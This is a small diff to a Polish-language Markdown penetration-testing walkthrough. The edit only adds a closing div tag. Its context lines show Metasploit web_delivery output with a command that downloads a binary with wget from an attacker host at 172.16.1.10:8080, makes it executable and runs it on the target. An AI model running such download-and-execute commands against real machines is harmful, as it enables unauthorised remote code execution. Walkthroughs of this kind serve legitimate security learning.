@@ -121,6 +121,7 @@ msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/L49
 [*] Run the following command on the target machine:
 wget -qO o6OY7FJX --no-check-certificate http://172.16.1.10:8080/L495CA; chmod +x o6OY7FJX; ./o6OY7FJX& disown
 ```
+</div>
 Dostajemy link, który trzeba przekonwertować na kod URL. można to zrobić [tutaj](https://www.urldecoder.org/)
 {: .text-justify}
 <div class="notice--primary" markdown="1">
